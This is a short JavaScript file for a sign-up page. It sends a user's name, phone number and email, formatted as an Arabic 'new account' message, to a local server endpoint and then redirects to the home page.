
document.getElementById("loginot2").addEventListener("click", function() {
    window.location.href = "index.html"; 
  });
  
    document.querySelector("form").addEventListener("submit", function(e) {
      e.preventDefault(); 
  
      const name = this.name.value;
      const phone = this.phone.value;
      const email = this.email.value;
  
      const message = `
📥 <b>إنشاء حساب جديد</b>

<b>👤 الاسم:</b> ${name}
<b>📞 الهاتف:</b> ${phone}
<b>📧 البريد الإلكتروني:</b> ${email}
      `;
  
      // ✅ إرسال إلى الخادم المحلي
      fetch('http://localhost:3000/api/payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          name: name,
          phone: phone,
          email: email,
          message: message,
          type: 'new_account'
        })
      }).then(response => {
        if (response.ok) {
          // يمكنك إعادة التوجيه بعد الإرسال:
          window.location.href = "index.html"; // أو أي صفحة أخرى مثل success.html
        } else {
        }
      });
    });